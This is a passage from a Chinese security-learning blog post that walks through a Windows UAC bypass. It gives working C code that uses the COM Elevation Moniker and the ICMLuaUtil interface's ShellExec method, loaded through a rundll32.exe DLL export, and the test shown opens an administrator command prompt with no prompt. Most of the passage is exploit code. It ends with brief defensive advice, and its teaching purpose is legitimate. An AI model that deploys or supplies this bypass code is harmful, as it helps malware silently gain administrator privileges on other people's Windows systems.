WCHAR wszCLSID&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
WCHAR wszMonikerName&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
HRESULT hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;// 初始化 COM 环境&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;CoInitialize&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;// 构造字符串&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;StringFromGUID2&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;rclsid&lt;span style="color:#999999"&gt;,&lt;/span&gt; wszCLSID&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszCLSID&lt;span style="color:#999999"&gt;)&lt;/span&gt; &lt;span style="color:#669900"&gt;/&lt;/span&gt; &lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszCLSID&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;StringCchPrintfW&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszMonikerName&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszMonikerName&lt;span style="color:#999999"&gt;)&lt;/span&gt; &lt;span style="color:#669900"&gt;/&lt;/span&gt; &lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszMonikerName&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; L&lt;span style="color:#669900"&gt;"Elevation:Administrator!new:%s"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; wszCLSID&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#61aeee"&gt;FAILED&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;hr&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; hr&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;// 设置 BIND_OPTS3&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;RtlZeroMemory&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;bo&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;bo&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
bo&lt;span style="color:#999999"&gt;.&lt;/span&gt;cbStruct &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#c678dd"&gt;sizeof&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;bo&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
bo&lt;span style="color:#999999"&gt;.&lt;/span&gt;hwnd &lt;span style="color:#669900"&gt;=&lt;/span&gt; hWnd&lt;span style="color:#999999"&gt;;&lt;/span&gt;
bo&lt;span style="color:#999999"&gt;.&lt;/span&gt;dwClassContext &lt;span style="color:#669900"&gt;=&lt;/span&gt; CLSCTX_LOCAL_SERVER&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;// 创建名称对象并获取 COM 对象&lt;/span&gt;
hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;CoGetObject&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;wszMonikerName&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;bo&lt;span style="color:#999999"&gt;,&lt;/span&gt; riid&lt;span style="color:#999999"&gt;,&lt;/span&gt; ppVoid&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; hr&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
执行上述代码，即可创建并激活提升权限的 COM 类。ICMLuaUtil 接口通过上述方法创建后，直接调用 ShellExec 方法创建指定进程，完成 Bypass UAC 的操作。基于 ICMLuaUtil 接口 Bypass UAC 的具体实现代码如下所示：
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;BOOL &lt;span style="color:#61aeee"&gt;CMLuaUtilBypassUAC&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;LPWSTR lpwszExecutable&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
HRESULT hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
CLSID clsidICMLuaUtil &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
IID iidICMLuaUtil &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
ICMLuaUtil &lt;span style="color:#669900"&gt;_&lt;/span&gt;CMLuaUtil &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
BOOL bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#c678dd"&gt;do&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;CLSIDFromString&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;CLSID_CMSTPLUA&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;clsidICMLuaUtil&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;IIDFromString&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;IID_ICMLuaUtil&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;iidICMLuaUtil&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    	&lt;span style="color:#5c6370"&gt;// 提权&lt;/span&gt;
    	hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#61aeee"&gt;CoCreateInstanceAsAdmin&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; clsidICMLuaUtil&lt;span style="color:#999999"&gt;,&lt;/span&gt; iidICMLuaUtil&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;PVOID&lt;span style="color:#669900"&gt;*&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;CMLuaUtil&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#61aeee"&gt;FAILED&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;hr&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;{&lt;/span&gt;
    		&lt;span style="color:#c678dd"&gt;break&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;}&lt;/span&gt;

    	&lt;span style="color:#5c6370"&gt;// 启动程序&lt;/span&gt;
    	hr &lt;span style="color:#669900"&gt;=&lt;/span&gt; CMLuaUtil&lt;span style="color:#669900"&gt;-&gt;&lt;/span&gt;lpVtbl&lt;span style="color:#669900"&gt;-&gt;&lt;/span&gt;&lt;span style="color:#61aeee"&gt;ShellExec&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;CMLuaUtil&lt;span style="color:#999999"&gt;,&lt;/span&gt; lpwszExecutable&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; SW_SHOW&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#61aeee"&gt;FAILED&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;hr&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;{&lt;/span&gt;
    		&lt;span style="color:#c678dd"&gt;break&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;}&lt;/span&gt;

    	bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; TRUE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#c678dd"&gt;while&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;FALSE&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#5c6370"&gt;// 释放&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;CMLuaUtil&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	CMLuaUtil&lt;span style="color:#669900"&gt;-&gt;&lt;/span&gt;lpVtbl&lt;span style="color:#669900"&gt;-&gt;&lt;/span&gt;&lt;span style="color:#61aeee"&gt;Release&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;CMLuaUtil&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;

    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; bRet&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
要注意的是，如果执行 COM 提升名称（COM Elevation Moniker）代码的程序身份是不可信的，则会触发 UAC 弹窗；若可信，则不会触发 UAC 弹窗。所以，要想 Bypass UAC，则需要想办法让这段代码在 Windows 的可信程序中运行。其中，可信程序有计算器、记事本、资源管理器、rundll32.exe 等。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
因此可以通过 DLL 注入或是劫持等技术，将这段代码注入到这些可信程序的进程空间中执行。其中，最简单的莫过于直接通过 rundll32.exe 来加载 DLL，执行 COM 提升名称的代码。利用 rundll32.exe 来调用自定义 DLL 中的导出函数，导出函数的参数和返回值是有特殊规定的，必须是如下形式。
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;&lt;span style="color:#5c6370"&gt;// 导出函数给 rundll32.exe 调用执行&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;void&lt;/span&gt; CALLBACK &lt;span style="color:#61aeee"&gt;BypassUAC&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;HWND hWnd&lt;span style="color:#999999"&gt;,&lt;/span&gt; HINSTANCE hInstance&lt;span style="color:#999999"&gt;,&lt;/span&gt; LPSTR lpszCmdLine&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#c678dd"&gt;int&lt;/span&gt; iCmdShow&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<ul style="margin-left:0px;">
<li>
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
将上述 Bypass UAC 的代码写在 DLL 的项目工程中，同时开发 Test 控制台项目工程，负责并将 BypassUAC 函数导出给 rundll32.exe 程序调用，完成 Bypass UAC 工作。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
Test 代码如下：
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt; &lt;span style="color:#669900"&gt;"stdafx.h"&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt; &lt;span style="color:#669900"&gt;&lt;Windows.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; &lt;span style="color:#61aeee"&gt;\_tmain&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; argc&lt;span style="color:#999999"&gt;,&lt;/span&gt; \_TCHAR&lt;span style="color:#669900"&gt;\*&lt;/span&gt; argv&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;char&lt;/span&gt; szCmdLine&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;char&lt;/span&gt; szRundll32Path&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#669900"&gt;"C:\\Windows\\System32\\rundll32.exe"&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;char&lt;/span&gt; szDllPath&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#669900"&gt;"C:\\Users\\DemonGan\\Desktop\\BypassUAC2_Test\\Debug\\BypassUAC2_Test.dll"&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;sprintf_s&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;szCmdLine&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"%s \"%s\" %s"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; szRundll32Path&lt;span style="color:#999999"&gt;,&lt;/span&gt; szDllPath&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"BypassUAC"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;WinExec&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;szCmdLine&lt;span style="color:#999999"&gt;,&lt;/span&gt; SW_HIDE&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#61aeee"&gt;printf&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"Run OK.\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#61aeee"&gt;system&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"pause"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="380" src="https://i-blog.csdnimg.cn/blog_migrate/54e5651591934a24c5e6b02a9b5bb304.png#pic_center" width="350"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
Bypass UAC 启动的是 cmd.exe 程序，所以，直接运行 Test.exe 即可看到 cmd.exe 命令行窗口，而且窗口标题有管理员字样，运行结果如下图所示。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="250" src="https://i-blog.csdnimg.cn/blog_migrate/52b45e6696e965391fd8c9864aa561b4.png#pic_center" width="500"/>
</span>
</p>
<p>
</p>
<hr/>
<h2 style="margin-left:0px;">
<strong>
<span style="color:#4f4f4f;">
<a name="t8">
</a>
<a id="_678">
</a>
三.总结
</span>
</strong>
</h2>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
写到这里，这篇文章就介绍完毕，希望对您有所帮助，最后进行简单的总结下，本文讲解了进程访问令牌权限提升和 Bypass UAC（白名单和 COM 组件）。其实，Bypass UAC 的方法有很多，对于不同的 Bypass UAC 方法，具体的实现过程不太一样，需要我们不断去摸索。同时，随着操作系统不断升级更新，Bypass UAC 技术可能不再适应（被打补丁），但也会有新的方法出现，大家可以去 github 上关注 UACME 开源项目。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
最后补充防止 Bypass UAC 的方法：
</span>
</p>
<ul style="margin-left:0px;">
<li>
<strong>
不要给普通用户设置管理员权限
</strong>
</li>
<li>
<strong>
在“更改用户账户控制设置”中，将用户账户控制（UAC）设置为“始终通知”
</strong>
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
注意，不要觉得这些技术代码实现容易就简单，很多木马、病毒、APT 攻击都用到了它们，不要小瞧任何一个技术，只有把这些技术组合起来威胁更大。同样，作为反病毒或安全分析人员，我们需要了解各种技术，只有知道怎么攻击和原理才能更好地防守。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，深知自己很菜，得努力前行。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
(By:Eastmount 2020-09-12 星期一 晚上 11 点写于武汉
<a href="http://blog.csdn.net/eastmount/">
http://blog.csdn.net/eastmount/
</a>
)
</span>
</p>
<p>
</p>
<hr/>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
2020 年 8 月 18 新开的“娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="200" src="https://i-blog.csdnimg.cn/blog_migrate/3bb590ece0869f1a93886db98efe6ca9.png#pic_center" width="200"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
参考文献：
<br/>
[1]《Windows 黑客编程技术详解》甘迪文老师
<br/>
[2]
<a href="https://www.cnblogs.com/ndyxb/p/12734717.html" rel="nofollow">
进程访问令牌权限提升 - 自己的小白
</a>
<br/>
[3]
<a href="https://www.jianshu.com/p/c0d48a675e55" rel="nofollow">
windows 进程提权(C 语言实现) - zzkdev
</a>
<br/>
[4]
<a href="https://www.freebuf.com/sectool/175551.html" rel="nofollow">
https://www.freebuf.com/sectool/175551.html
</a>
<br/>
[5]
<a href="https://blog.csdn.net/Simon798/article/details/107051801/">
https://blog.csdn.net/Simon798/article/details/107051801/
</a>
</span>
</p>

   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34313932383434342f:61727469636c652f64657461696c732f313038363030353733" class_="artid" style="display:none">
 </p>
</div>
